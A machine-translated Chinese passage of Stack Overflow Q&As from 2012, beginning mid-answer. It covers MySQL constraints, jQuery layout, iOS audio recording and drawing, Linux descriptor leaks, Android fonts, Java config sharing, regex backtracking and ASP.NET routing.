如果这些测试按预期工作，那么一切都很好，而您的问题实际上是您想防止插入空白字符串。查看[此问题](https://stackoverflow.com/questions/2514178/im-looking-for-a-constraint-to-prevent-the-insert-of-an-empty-string-in-mysql)以获取建议，或者在查询之前在验证期间检查空白字符串。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-04-18T21:42:31.537

MySQL 的列更改语法要求您完全重新指定列。您不能只更改列的一个属性，您必须完全重新定义它：

```
ALTER TABLE wall MODIFY token_message varchar(40) NOT NULL default '' 
```

唯一允许的“SET”版本是更改默认值。

参考：[http ://dev.mysql.com/doc/refman/5.1/en/alter-table.html](http://dev.mysql.com/doc/refman/5.1/en/alter-table.html)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-04-18T22:09:13.747

我认为这是清理您的输入的问题。正如 octern 所提到的，空字符串 ('') 在 sql 中不是 NULL 值。处理此问题的最佳方法是仅允许通过删除空字符串甚至空格字符的存储过程进行更新：

```
CREATE PROC InsertIntoMyDb (@MyVarChar VARCHAR(2000)) AS

SET @MyVarChar = NULLIF(RTRIM(LTRIM(@MyVarChar)), '')

INSERT INTO [TBL] (MyVarChar)
VALUES @MyVarChar 
```

这会将任意数量的空格截断为空字符串，将空字符串转换为 NULL，然后根据您已有的约束，不允许插入 NULL 值。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2014-01-20T04:40:55.693

尝试使用此查询

```
Alter table table_name 
change column_name column_name datatype(length) definition 
```

IE，

```
Alter table wall 
change tocken_message tocken_message varchar(40) NOT NULL DEFAULT 
```

# jquery - 使用新内容重新计算 jQuery 等高脚本

> ID：10218253
> 
> 赞同：1
> 
> 时间：2012-04-18T21:25:21.713
> 
> 标签：jquery

我正在使用[这个 jQuery 插件](http://www.jainaewen.com/files/javascript/jquery/equal-height-columns.html)来获取主要内容和侧边栏以匹配高度——效果很好。但是我现在正在更新成员目录页面，并且我已经设置了名称，以便在单击它们时从基本列表扩展到完整列表。但是，我无法让内容和侧边栏 div 与它们展开和收缩。

这是一个包含虚拟内容的示例页面：http: [//stylesmithonline.com/AWAD_test/AWAD_directory_test.html](http://stylesmithonline.com/AWAD_test/AWAD_directory_test.html)（注意：我知道我需要将这些 onClick 事件移动到它们自己的函数中——其他人创建了原始站点，所以我有一些清洁工作）。

我尝试将“扩展”类添加到链接并使用以下方法调用该函数：

```
$(document).delegate('.expand', 'click', function(){
$("#content, #sidebar, #content-sidebar-wrap").equalHeightColumns();
}); 
```

如果我删除对函数的原始调用，它会工作一次：

```
$(window).load(function() {
$("#content, #sidebar, #content-sidebar-wrap").equalHeightColumns();
}); 
```

此外，如果我将特定高度传递给单击事件，它将起作用。

知道为什么它没有按照我想要的方式扩展和收缩吗？

谢谢，斯科特

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-18T21:35:38.503

查看文档，我认为它不起作用，因为高度是通过读取 div 的高度来设置的。但是，您的主 div 已经由插件设置了高度，并且在添加更多内容时这不会改变。

`auto`在调用插件之前尝试将 div 的高度重置为：

```
$("#content, #sidebar, #content-sidebar-wrap").css('height','auto').equalHeightColumns(); 
```

此外，如果您因为白色背景而尝试匹配高度，请允许我提出一个替代方案：使用[Faux Columns](http://www.alistapart.com/articles/fauxcolumns/)技术。可以为您省去很多麻烦。

# html - 使用 CSS3 获取设备物理尺寸

> ID：10218254
> 
> 赞同：2
> 
> 时间：2012-04-18T21:25:22.463
> 
> 标签：html, css, media-queries

我有一个在开发中使用 CSS3 和 SVG 图形的 HTML5 页面。当设备像素比为 1.5 或 2 时，我尝试使用媒体查询来放大 SVG 图形。这很好用。现在我在摩托罗拉 Xoom 这样的小型设备上查看我的页面。报告的比率是 1。这意味着与常规显示器相比，Xoom 显示的所有内容都非常小。最烦人的部分是它在横向模式下看起来很棒，但在纵向模式下，整个页面会调整大小以适应相同的宽度。此时比率数不会改变。

我确实尝试过使用类似“宽度：3in;”的东西 但同样，它只是横向的正确尺寸。

最终，我想使用某种设备大小与像素大小的比率，并以这种方式缩放所有内容。这可能吗？

* * *

## 回答 #1

> 赞同：-1
> 
> 时间：2012-04-19T20:44:56.310

我的问题是，当方向改变时，我的图形再也没有渲染过。当我再次点击刷新时，一切都按预期进行。这是我的键盘和椅子之间存在的问题。媒体查询实际上是有效的，我只需要在方向改变时重新渲染一些东西。

# ios - iOS - 播放录制的音频失败并出现 OSStatus 错误 -43（未找到文件）

> ID：10218257
> 
> 赞同：5
> 
> 时间：2012-04-18T21:25:37.147
> 
> 标签：ios, avfoundation, core-audio, avaudioplayer, avaudiorecorder

当我的视图加载时，我通过以下方式设置了一个 AVAudioRecorder 实例：

```
AVAudioSession *audioSession = [AVAudioSession sharedInstance];
audioSession.delegate = self;
[audioSession setActive:YES error:nil];
[audioSession setCategory:AVAudioSessionCategoryRecord error:nil];

NSString *tempDir = NSTemporaryDirectory();
NSString *soundFilePath = [tempDir stringByAppendingPathComponent:@"sound.m4a"];

NSURL *soundFileURL = [NSURL fileURLWithPath:soundFilePath];
NSLog(@"%@", soundFileURL);

NSDictionary *recordSettings = [NSDictionary dictionaryWithObjectsAndKeys:
                                [NSNumber numberWithInt:kAudioFormatMPEG4AAC], AVFormatIDKey,
                                [NSNumber numberWithInt:AVAudioQualityMin], AVEncoderAudioQualityKey,
                                [NSNumber numberWithInt:16], AVEncoderBitRateKey,
                                [NSNumber numberWithInt: 1], AVNumberOfChannelsKey,
                                [NSNumber numberWithFloat:8000.0], AVSampleRateKey,
                                [NSNumber numberWithInt:8], AVLinearPCMBitDepthKey,
                                nil];

NSError *error = nil;

self.recorder = [[AVAudioRecorder alloc]
                 initWithURL:soundFileURL
                 settings:recordSettings
                 error:&error];
self.recorder.delegate = self;

if (error) {
    NSLog(@"error: %@", [error localizedDescription]);
} else {
    [self.recorder prepareToRecord];
} 
```

然后，当用户按下录制按钮时，我会：

```
- (IBAction)record:(id)sender {
    if (!self.isRecording) {
        self.isRecording = YES;
        [self.recorder record];
        self.recordButton.enabled = NO;
    }
} 
```

然后停止录制/播放：

```
- (IBAction)stop:(id)sender {
    if (self.isRecording) {
        [self.recorder stop];
        self.recordButton.enabled = YES;
        self.isRecording = NO;
    }

    if (self.isPlaying) {
        [self.player stop];
        self.isPlaying = NO;
        self.playButton.enabled = YES;
    }
} 
```

之后，我希望能够播放录制的内容，所以我执行以下操作：

```
- (IBAction)play:(id)sender {
    NSError *error = nil;
    self.player = [[AVAudioPlayer alloc] initWithContentsOfURL:self.recorder.url error:&error];
    self.player.delegate = self;

    if (error) {
        NSLog(@"%@", error.localizedDescription);
    } else {
        self.isPlaying = YES;
        [self.player play];
        self.playButton.enabled = NO;
    }
} 
```

但是当我去播放文件时得到**OSStatus 错误 -43**文件未找到。

顺便说一句，这一切都在设备上运行，在模拟器上尝试实例化记录器或播放器时出现错误，从我看来这是一个模拟器问题。

**编辑 1：**我解决了 OSStatus 错误 -43 部分，它与编码格式有关，我注释掉了格式并正确记录和播放文件，但我需要以压缩格式记录。有谁知道这个的设置？

**编辑 2：**我设法找到适用于压缩 AAC 音频的设置。一个 2 分钟的音频文件大小为 256KB，我更新了代码以反映当前状态。感谢所有回答您的帮助的人。

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-04-23T20:31:21.400

由于没有人回答（编辑：现在有）（我对 iOS 中的音频没有太多经验），所以我将对此进行疯狂的尝试，但是......

尝试改变

```
[[AVAudioSession sharedInstance] setCategory:AVAudioSessionCategoryRecord error:nil]; 
```

到

```
[[AVAudioSession sharedInstance] setCategory:AVAudioSessionCategoryPlayAndRecord error:nil]; 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-04-29T15:09:49.873

`AVEncoderBitRateKey`不适用于`AAC`格式编码。所以试试这个代码。

```
NSURL *soundFileURL = [NSURL fileURLWithPath:soundFilePath];
NSLog(@"%@", soundFileURL);

 NSDictionary *recordSettings = [NSDictionary 
                                        dictionaryWithObjectsAndKeys:
                                        [NSNumber numberWithInt:kAudioFormatMPEG4AAC],
                                        AVFormatIDKey,
                                        [NSNumber numberWithInt: AVAudioQualityMax],
                                        AVEncoderAudioQualityKey,
                                        [NSNumber numberWithInt: 1], 
                                        AVNumberOfChannelsKey,
                                        [NSNumber numberWithFloat:44100.0], 
                                        AVSampleRateKey,
                                        nil];
NSError *error = nil;

self.recorder = [[AVAudioRecorder alloc]
                 initWithURL:soundFileURL
                 settings:recordSettings
                 error:&error];
self.recorder.delegate = self;

if (error) {
    NSLog(@"error: %@", [error localizedDescription]);
    NSLog(@"error: %@", [error description]);
} else {
    [self.recorder prepareToRecord];
} 
```

**编辑1：**

**未找到 OSStatus 错误 -43 文件不是**模拟器问题。这是一个错误日志，显示您的`recording settings are not correct`和 required `encoding format is not supported for the settings you have selected`。

当您收到此错误时，您的文件将以您给定的格式创建。但它会`not initialize your audio recorder to start recording`。如果您有任何疑问，请选择与第一个问题相同的设置并录制并尝试播放。由于不支持的设置，它不会录制和播放。

因此，对于 a `compressed encoding format`，您可以使用我上面在代码中给出的设置。您可以`.aac`为此设置设置格式。它将采取`164KB per 10 seconds to record in aac`格式。对于其余格式，您必须尝试弄清楚。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-04-23T20:33:23.847

您可能需要将 AVAudioSession 类别设置回播放模式：

```
NSError *_error = nil;
[[AVAudioSession sharedInstance] setCategory: AVAudioSessionCategoryPlayback error:&_error];

if (_error) {
    // handle error here
} 
```

这也应该避免在打开静音开关的情况下无法播放音频的问题。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-04-23T22:04:31.543

好的试试这个：

`NSURL *soundFileURL`为您的班级设置全局，以便您可以在班级的任何地方访问它，并以与现在相同的方式进行设置（除了它会`soundFileURL = [NSURL fileURLWithPath:soundFilePath];`代替`NSURL *soundFileURL = [NSURL fileURLWithPath:soundFilePath];`.

然后改变这个

```
self.player = [[AVAudioPlayer alloc] initWithContentsOfURL:self.recorder.url error:&error]; 
```

对此

```
self.player = [[AVAudioPlayer alloc] initWithContentsOfURL:soundFileURL error:&error]; 
```

# websphere-portal - 在哪里设置 WPS portlet 权限

> ID：10218265
> 
> 赞同：1
> 
> 时间：2012-04-18T21:26:16.723
> 
> 标签：websphere-portal

我正在 WPS 6.1 上部署一个 portlet。当我尝试访问 portlet 时，我得到：

```
We are sorry, but you have no permissions to see this page 
```

我在哪里设置权限？我刚刚创建了一个页面并添加了 portlet

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-24T00:57:30.093

当您转到 Manage Pages portlet 时，您创建的页面旁边有一个图标，看起来像一个键。单击钥匙图标。有一个默认卷的列表。在“用户”角色旁边，单击“编辑卷”的铅笔图标。然后是有权访问卷的用户和组的列表。顶部是一个“添加+”按钮。点击那个。将有一个默认组列表。单击“匿名门户用户”旁边的复选框，然后单击其下方的按钮“确定”。这部分不直观，因为没有保存按钮。只需点击用户角色上方的链接“页面名称 > 用户”即可。单击“页面名称”链接。然后单击“应用”按钮。现在注销并尝试查看您的页面。它应该可供匿名用户使用。-p

# linux-kernel - 调试文件描述符泄漏（在内核中？）

> ID：10218266
> 
> 赞同：6
> 
> 时间：2012-04-18T21:26:19.313
> 
> 标签：linux-kernel, kernel, memory-leaks, file-descriptor, lsof

我在这个相对较大的代码库中工作，我看到文件描述符泄漏并且进程开始抱怨在我运行某些程序后它们无法打开文件。

虽然这发生在 6 天后，但我可以通过将 /proc/sys/fs/file-max 中的值减少到 9000 来在 3-4 小时内重现该问题。

随时都有许多进程在运行。我已经能够查明可能导致泄漏的几个过程。但是，我没有看到任何文件描述符通过 lsof 或 /proc//fd 泄漏。

如果我杀死我怀疑泄漏的进程（它们相互通信），泄漏就会消失。FD 被释放。

cat /proc/sys/fs/file-nr 在 while(1) 循环中显示泄漏。但是，我在任何过程中都没有看到任何泄漏。

这是我编写的用于检测正在发生泄漏的脚本：

```
#!/bin/bash

if [ "$#" != "2" ];then
    name=`basename $0`
    echo "Usage : $name <threshold for number of pids> <check_interval>"
    exit 1
fi

fd_threshold=$1
check_interval=$2
total_num_desc=0
touch pid_monitor.txt
nowdate=`date`
echo "=================================================================================================================================" >> pid_monitor.txt
echo "****************************************MONITORING STARTS AT $nowdate***************************************************" >> pid_monitor.txt

while [ 1 ]
do
    for x in `ps -ef | awk '{ print $2 }'`
    do
        if [ "$x" != "PID" ];then
            num_fd=`ls -l /proc/$x/fd 2>/dev/null | wc -l`
            pname=`cat /proc/$x/cmdline 2> /dev/null`
            total_num_desc=`expr $total_num_desc + $num_fd`
            if [ $num_fd -gt $fd_threshold ]; then
                echo "Proces name $pname($x) and number of open descriptor = $num_fd" >> pid_monitor.txt
            fi
        fi
    done
    total_nr_desc=`cat /proc/sys/fs/file-nr`
    lsof_desc=`lsof | wc -l`
    nowdate=`date`
    echo "$nowdate : Total number of open file descriptor = $total_num_desc lsof desc: = $lsof_desc file-nr descriptor = $total_nr_desc" >> pid_monitor.txt
    total_num_desc=0
    sleep $2
done 
```

./monitor.fd.sh 500 2 & 尾 -f pid_monitor.txt

正如我之前提到的，我在 /proc//fd 中没有看到任何泄漏，但是肯定会发生泄漏，并且系统的文件描述符已用完。

我怀疑内核中的某些东西正在泄漏。Linux 内核版本 2.6.23。

我的问题如下：

1.  将 'ls /proc//fd' 显示链接到进程的任何库的列表描述符 pid 。如果不是，我如何确定我链接到的库中何时存在泄漏。

2.  我如何确认泄漏是在用户空间还是在内核中。

3.  如果泄漏在内核中，我可以使用哪些工具进行调试？

4.  你可以给我任何其他提示。

感谢您耐心地回答问题。

非常感谢任何帮助。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-25T22:40:03.310

找到了问题的解决方案。

在某些函数中发生了共享内存附加，并且该函数每 30 秒被调用一次。共享内存附加从未分离，因此描述符泄漏。我猜 /proc//fd 没有将共享内存附加显示为描述符。因此我的脚本无法捕获文件描述符泄漏。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-22T10:49:09.933

哪些进程开始抱怨？你看到的错误是什么？您的监控脚本的输出是什么？

要打开一个文件，您需要两个东西，一个文件描述符和一个`struct file`- 或文件描述。文件描述符是用户空间使用的，在内核内部它用于查找`struct file`. 我不清楚你在泄漏哪个。

# iphone - iOS：CGContextRef drawRect 不同意输入

> ID：10218279
> 
> 赞同：0
> 
> 时间：2012-04-18T21:27:20.850
> 
> 标签：iphone, ios, drawrect, setneedsdisplay, cgcontextref

**背景**：当用户触摸某处时，我想绘制块。如果块在那里，我想擦除它。我通过使用`NSMutableArray`来跟踪块应该去的点来管理块。每次用户触摸时，它都会判断触摸位置是否已经包含一个块，并相应地管理数组。

**问题**：我收到了一个非常奇怪的反馈。首先，数组中的所有内容都按我的意愿工作。当用户想要擦除一个块时，问题就出现了。虽然正确维护了数组，但绘图似乎忽略了数组中的更改。除了最后一个点，它不会删除任何东西。甚至当用户点击其他地方时，闪烁也会打开和关闭。

**这是代码**：

```
- (void)drawRect:(CGRect)rect
{
    NSLog(@"drawrect current array %@",pointArray);
    for (NSValue *pointValue in pointArray){
        CGPoint point = [pointValue CGPointValue];
        [self drawSquareAt:point];
    }
} 

- (void) drawSquareAt:(CGPoint) point{
    float x = point.x * scale;
    float y = point.y * scale; 

    CGContextRef context = UIGraphicsGetCurrentContext();
    CGContextMoveToPoint(context, x, y);
    CGContextAddLineToPoint(context, x+scale, y);
    CGContextAddLineToPoint(context, x+scale, y+scale);
    CGContextAddLineToPoint(context, x, y+scale);
    CGContextAddLineToPoint(context, x, y);

    CGContextSetFillColorWithColor(context, [UIColor darkGrayColor].CGColor);
    CGContextFillPath(context);
}

- (void)touchesEnded:(NSSet *)touches withEvent:(UIEvent *)event
{
    UITouch *aTouch = [touches anyObject];
    CGPoint point = [aTouch locationInView:self];
    point = CGPointMake( (int) (point.x/scale), (int) (point.y/scale));
    NSLog(@"Touched at %@", [NSArray arrayWithObject: [NSValue valueWithCGPoint:point]]);

    NSValue *pointValue = [NSValue valueWithCGPoint:point];
    int i = [pointArray indexOfObject:pointValue];
    NSLog(@"Index at %i",i);
    if (i < [pointArray count]){
        [pointArray removeObjectAtIndex:i];
        NSLog(@"remove");
    }else {
        [pointArray addObject:pointValue];
        NSLog(@"add");
    }
    NSLog(@"Current array : %@", pointArray);

    [self setNeedsDisplay];
} 
```

`scale`定义为 16. `pointArray`是视图的成员变量。

**测试**：您可以将其放入任何 UIView 并将其添加到 viewController 以查看效果。

**问题**：如何让绘图与数组一致？

* * *

**更新 + 说明**：我知道这种方法的成本，但它只是为我创建一个快速的数字。它不会在实际应用中使用，因此，请不要挂断它的价格。我创建此功能只是为了在我绘制的图形的`NSString`( ) 中获取值。`@"1,3,5,1,2,6,2,5,5,..."`当我实际使用它而不重绘时，这将变得更有效率。请坚持提出的问题。谢谢你。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-18T21:59:10.033

我看不到您实际上在清除以前绘制的任何内容的任何地方。除非您明确清除（例如通过填充`UIRectFill()`- 顺便说一句，这是一种比填充显式路径更方便的绘制矩形的方法），否则 Quartz 只会覆盖您的旧内容，这将导致尝试时出现意外行为在擦除。

所以......如果你放在开头会发生什么`-drawRect:`：

```
[[UIColor whiteColor] setFill]; // Or whatever your background color is
UIRectFill([self bounds]); 
```

（这当然是非常低效的，但是根据您的评论，我无视这一事实。）

（另外，您可能应该将绘图代码包装在`CGContextSaveGState()`/`CGContextRestoreGState()`对中，以避免污染任何调用代码的图形上下文。）

编辑：我总是忘记这个属性，因为我通常想绘制更复杂的背景，但你可以通过`clearsContextBeforeDrawing:YES`在 UIView 上进行设置来获得类似的结果。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-18T21:39:38.910

这种方法对我来说似乎有点奇怪，因为每次调用 touchesEnded 方法时，您都需要重新绘制（这是一项昂贵的操作）并且还需要跟踪正方形。我建议你继承一个 UIView 并实现 drawRect: 方法，这样视图知道如何绘制自己并在你的视图控制器中实现 touchesEnded 方法，在那里你可以检查你是否触摸了一个 squareView 然后将它从视图控制器的视图中删除，否则创建一个 squareView 并将其作为子视图添加到视图控制器的视图中。

# windows-mobile - 适用于 Windows Mobile 6.5 的 Rhomobile 构建

> ID：10218290
> 
> 赞同：0
> 
> 时间：2012-04-18T21:27:57.100
> 
> 标签：windows-mobile, rhomobile, rhodes

如何在 Windows Mobile 6.5 中构建 Rhomobile？

我有 Windows Mobile 6.5 DTK，模拟器显示在设备模拟器管理器中。

我在项目的 build.yml 中放了什么：
wm:
sdk: Windows Mobile 6.5.3 Professional DTK (ARMV4I)
emulator: Windows Mobile 6.5.3 Professional VGA Emulator

我得到了错误：

```
vcbuild.exe : error VCBLD0007: Could not find project configuration RELEASE|WINDOWS MOBILE 6.5.3 PROFESSIONAL DTK (ARMV4I) to build.

No such file or directory - C:/RhoStudio/ruby/lib/ruby/gems/1.8/gems/rhodes-3.3.2/platform/wm/bin/Windows Mobile 6.5.3 Professional DTK (ARMV4I)/rhodes/Release/rhodes.exe 
```

我错过了什么吗？这听起来很愚蠢，但是我如何将 Windows Mobile 6.5.3 文件放入 Rhostudio，因为我不记得为 Windows Mobile 6 做了什么特别的事情？

再次抱歉，如果这是一个愚蠢的问题，我真的无法理解它。谢谢你的帮助。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-19T07:47:36.880

[Rhomobile 有一个非常详细的指南，说明您需要如何在此处](http://docs.rhomobile.com/rhodes/build#build-for-windows-mobile)为 Windows Mobile 设置 Rhodes 。对我来说，听起来您可能忘记运行`rhodes-setup`命令以在您的 rhobuild.yml 文件中正确设置路径（不是您的项目 build.yml，而是位于您的 rhodes 目录中的那个）。

文档指出它应该看起来像这样：

```
env:
   paths:
     vcbuild: C:/Program Files/Microsoft Visual Studio 8/VC/vcpackages/vcbuild.exe
     cabwiz: C:/Program Files/Windows Mobile 6 SDK/Tools/CabWiz 
```

在某些情况下（例如，如果您使用 Visual Studio 2010），设置可能会有所不同。[查看此部分](http://docs.rhomobile.com/rhodes/build#build-for-windows)并将路径添加到您的`PATH`环境变量也可能很有用。

如果这些东西都没有帮助，我建议你[在 GitHub 上](https://github.com/rhomobile/rhodes)下载他们的 master 分支的最新版本，因为我知道不久前为 Windows Mobile 构建存在问题，该问题已得到修复。根据我的记忆，它预定在Rhodes 3.3.3版本发布。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-22T09:16:05.937

我确实遇到了这个问题，并且能够通过指向 Right vcbuild.exe 来解决这个问题。我发现随 Express Editions 一起提供的 vcbuild.exe 不起作用，但后来我针对（Visual Studio Team System 2008，它存在于文件夹 Microsoft Visual Studio 2009 而不是 2008 中）的 VCBuild.exe，它起作用了。

我想你已经知道了，但也只是添加：

您必须设置 VS 构建工具路径@RhoStudio -。Windo -> 首选项 -> RhoMobile -> Windows Mobile。

希望能帮助到你

谢谢苏梅特

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-05-20T10:09:17.203

重装WM6 SDK，取专业版，解封MSI文件，以管理员权限安装（最简单的方法是以管理员身份运行cmd）

这对我有用。

# android - Android - 无法理解代码

> ID：10218295
> 
> 赞同：-5
> 
> 时间：2012-04-18T21:28:06.693
> 
> 标签：android, android-layout

有人可以尝试为我解释这段代码吗，我真的不明白其中的任何一个，而且网络上似乎没有任何地方可以解释它。我带来了一份“Android Development for Dummies”，但它并没有真正帮助我。

```
private TextView txtMineCount;
private TextView txtTimer;
txtMineCount = (TextView) findViewById(R.id.MineCount);
txtTimer = (TextView) findViewById(R.id.Timer);

// set font style for timer and mine count to LCD style
Typeface lcdFont = Typeface.createFromAsset(getAssets(),
    "fonts/lcd2mono.ttf");
txtMineCount.setTypeface(lcdFont);
txtTimer.setTypeface(lcdFont); 
```

提前谢谢各位。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-04-18T21:51:05.527

```
private TextView txtMineCount;
private TextView txtTimer; 
```

这声明了两个可以保存对[TextView](http://developer.android.com/reference/android/widget/TextView.html)的引用的局部变量。起初它们没有指向任何东西......所以你必须分配它们。

```
txtMineCount = (TextView) findViewById(R.id.MineCount);
txtTimer = (TextView) findViewById(R.id.Timer); 
```

这里我们分配两个变量。我们调用框架的一个方法在由 ID 创建的基于文本的小部件中进行查找。重要的是，我们不是在这里创建这些小部件。我们只是找到与我们用来命名它们的一些 ID 常量相对应的已分配对象实例。

假设这些查找在一般情况下成功并不一定“安全”，因为[View.findViewById()](http://developer.android.com/reference/android/view/View.html#findViewById(int))可以返回`null`。但是编写此代码的人假设确实在代码的其他地方创建了具有这些特定 ID 的 TextView 对象。

*（如果他们错了，那么尝试设置字体`txtMineCount`或`txtTimer`只会导致异常......）*

```
// set font style for timer and mine count to LCD style
Typeface lcdFont = Typeface.createFromAsset(getAssets(),
    "fonts/lcd2mono.ttf"); 
```

Android 有一些系统附带的默认字体。但是这个程序想要使用嵌入在应用程序资源的字体子目录中的[TrueType 字体文件](http://en.wikipedia.org/wiki/TrueType)（基本上是在应用程序包中传播的一堆文件）。这会创建一个 Typeface 对象，该对象适合应用于该文件中的 TextView。

```
txtMineCount.setTypeface(lcdFont);
txtTimer.setTypeface(lcdFont); 
```

这只是将两个 TextView 使用的字体设置为上面的字体。

* * *

请注意，您可以在没有中间变量的情况下获得等效效果。此代码应该与您发布的内容相同：

```
((TextView)findViewById(R.id.MineCount)).setTypeface(
    Typeface.createFromAsset(getAssets(), "fonts/lcd2mono.ttf"));

((TextView)findViewById(R.id.Timer)).setTypeface(
    Typeface.createFromAsset(getAssets(), "fonts/lcd2mono.ttf")); 
```

但这种方式更难阅读，并且通过不将中间结果保存在变量中，您最终可能会多次计算该中间结果。例如，`Typeface.createFromAsset`当您以这种方式编写代码时，代码会使用相同的参数运行两次。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-04-18T21:30:27.393

我不确定你的问题是什么：

1.  您在 .xml 布局中定义了几个视图：txtMineCount 和 txtTimer。

2.  您正在使用 findViewById() 在运行时检索 Textview 实例。

3.  您正在运行时在两个视图中设置“字体”属性。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-04-18T21:30:59.343

在我看来像扫雷克隆。它所做的是创建一个“TextView”的实例（可能是用于以某种字体显示文本的东西（在这种情况下是液晶显示器）。或者您是否需要确切地知道每一行代码的作用？

# java - 将静态字段传递给线程

> ID：10218296
> 
> 赞同：2
> 
> 时间：2012-04-18T21:28:07.220
> 
> 标签：java, multithreading, static, final

我用 Java 编写了一个小型 HTTP 服务器，但在将静态变量（服务器配置：端口、根等）传递给处理请求的线程时遇到问题。我不希望我的线程修改这些变量，如果它扩展了服务器类，它也会继承我不想要的方法。

出于性能原因，我不想使用吸气剂。如果我将静态成员设为最终成员，则在从配置文件加载它们的值时会遇到问题。

这是一个例子

```
class HTTPServer {
static int port; 
static File root;
etc..
....
//must be public
public void launch() throws HTTPServerException {
    loadConfig();
    while (!pool.isShutdown()) {
            ....
        //using some config here
             ...
        try {
    Socket s = ss.accept();
    Worker w = new Worker(s);
    pool.execute(w);
        }catch () {...}
    }
}
private void loadConfig(){ //reading from file};
...
other methods that must be public goes here
} 
```

我也不想让工人作为嵌套类。它在另一个包裹里...

你有什么建议？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-18T21:37:49.200

您可以将您的配置放在最终的[AtomicReference](http://docs.oracle.com/javase/6/docs/api/java/util/concurrent/atomic/AtomicReference.html)中。然后它可以被您的工作人员引用并以线程安全的方式更新。

就像是：

```
class HTTPServer {
  public static final AtomicReference<ServerConf> config = 
    new AtomicReference(new ServerConf());
} 
```

使新`ServerConf`类不可变：

```
class ServerConf {
  final int port;
  final File root;
  public ServerConf(int port, File root) {
    this.port = port;
    this.root = root;
  } 
} 
```

然后您的工作人员可以通过`HTTPServer.config.get()`. 也许是这样的：

```
Worker w = new Worker(s, HTTPServer.config.get()); 
```

`loadConfig()`可以通过以下方式设置新配置：

```
HTTPServer.config.set(new ServerConf(8080, new File("/foo/bar")); 
```

如果同时更改所有配置并不重要，则可以跳过`ServerConf`该类并[`AtomicInteger`](http://docs.oracle.com/javase/6/docs/api/java/util/concurrent/atomic/AtomicInteger.html)用于端口设置和`AtomicReference<File>`根目录。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-18T21:37:30.827

将静态数据读入一个静态“sharedConfig”对象，该对象也有一个套接字字段——您可以将该字段用于监听套接字。当 acccpet() 返回 server<> 客户端套接字时， clone() 'sharedConfig'，插入新套接字并将该对象传递给 server<> 客户端工作线程。然后线程获取配置的副本，它可以擦除甚至修改它，而不影响任何其他线程或静态配置。

# javascript - 为什么 /^(.+)+Q$/.test("XXXXXXXXXXXXXXXXXXXXXXXXXXXXXX") 需要这么长时间？

> ID：10218300
> 
> 赞同：11
> 
> 时间：2012-04-18T21:28:13.217
> 
> 标签：javascript, regex, webkit

当我跑

```
/^(.+)+Q$/.test("XXXXXXXXXXXXXXXXXXXXXXXXXXXXXX") 
```

在 Chrome 或 IE 中，大约需要 10 秒才能完成。（Firefox 几乎可以立即评估它。）

为什么需要这么长时间？（以及 Firefox 为何/如何能够如此迅速地做到这一点？）

（当然，我永远不会运行这个特定的正则表达式，但我在[http://daringfireball.net/2010/07/improved_regex_for_matching_urls](http://daringfireball.net/2010/07/improved_regex_for_matching_urls)遇到了与 URL 正则表达式类似的问题，它似乎归结为这一点，即那里是某些会导致浏览器锁定的 URL）

例如：

```
var re = /\b((?:https?:\/\/|www\d{0,3}[.]|[a-z0-9.\-]+[.][a-z]{2,4}\/)(?:[^\s()<>]+|\(([^\s()<>]+|(\([^\s()<>]+\)))*\))+(?:\(([^\s()<>]+|(\([^\s()<>]+\)))*\)|[^\s`!()\[\]{};:'".,<>?«»“”‘’]))/i;
re.test("http://google.com/?q=(AAAAAAAAAAAAAAAAAAAAAAAAAAAAA") 
```

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-04-18T21:29:58.690

如 thg435 所示，这听起来像是灾难性的回溯。有一篇很棒的文章，[正则表达式匹配可以简单快速](http://swtch.com/~rsc/regexp/regexp1.html)。

它描述了一种称为 Thompson NFA 的有效方法。但是，如上所述，这并不支持现代正则表达式的所有功能。例如，它不能做反向引用。但是，正如文章中所建议的：

> “即便如此，对大多数正则表达式使用 Thompson 的 NFA 模拟是合理的，并且只在需要时才进行回溯。一个特别聪明的实现可以将两者结合起来，仅使用回溯来适应反向引用。”

我怀疑 Firefox 可能正在这样做。

# asp.net-mvc - asp.net mvc中的传出路由

> ID：10218302
> 
> 赞同：1
> 
> 时间：2012-04-18T21:28:26.880
> 
> 标签：asp.net-mvc, asp.net-mvc-routing

我正在阅读 Appress 中的 Pro ASP.NET MVC 3.0。第 11 章是关于 URL 路由系统的。在从传出部分传递额外变量时，解释了从 url 获取段值，例如用于以下路由：

```
routes.MapRoute("MyRoute", "{controller}/{action}/{color}/{page}"); 
```

如果用户当前位于 URL /Catalog/List/Purple/123，我们呈现如下链接：

```
@Html.ActionLink("Click me", "List", "Catalog", new {page=789}, null) 
```

路由系统将匹配路由并生成以下 HTML：

```
<a href="/Catalog/List/Purple/789">Click me</a> 
```

但是，当我将此代码用于以下示例时，它会生成：

```
 <a href="/Catalog/List/Purple/">Click me</a> 
```

我不明白为什么？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-18T21:32:37.617

尝试将该路由映射移到 global.asax 文件中的其他路由映射之上

# regex - 如何在正则表达式中进行可选断言？

> ID：10218307
> 
> 赞同：2
> 
> 时间：2012-04-18T21:28:50.903
> 
> 标签：regex

我有一个这样的示例字符串：（`aibicidieif`更复杂的字符串但格式相似）我尝试了一个正则表达式，`(?<=i).*?(?=i)`但它没有捕获第一个和最后一个元素`a`和`f`.

